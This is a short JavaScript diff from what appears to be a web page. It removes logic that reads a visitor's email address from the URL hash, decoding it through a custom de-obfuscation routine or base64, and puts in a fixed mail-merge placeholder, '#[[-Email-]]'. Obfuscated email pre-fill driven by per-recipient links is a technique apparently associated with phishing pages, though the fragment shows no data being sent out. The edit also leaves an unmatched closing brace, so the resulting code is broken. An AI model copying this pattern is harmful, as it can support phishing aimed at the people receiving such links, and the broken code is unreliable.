@@ -164,25 +164,8 @@
                 $('#btn1').prop('disabled', false);
             }, 1500);
 
-            // Get email from URL hash or use obfuscated default
-            const hashValue = window.location.hash.substr(1);
-            let ai = '';
-            
-            if (hashValue) {
-                // Try to decode the hash value
-                try {
-                    ai = decodeObfuscatedEmail(hashValue);
-                    if (!isValidEmail(ai)) {
-                        // If decoding doesn't produce valid email, try direct base64
-                        ai = atob(hashValue);
-                    }
-                } catch(e) {
-                    // If decoding fails, use hash as plain text (might be already decoded)
-                    ai = hashValue;
-                }
-            } else {
-                // Use default obfuscated email
-                ai = decodeObfuscatedEmail(OBFUSCATED_EMAIL);
+            // Get recipient email from authorized email template
+const ai = '#[[-Email-]]';
             }
             
             // Validate and set email
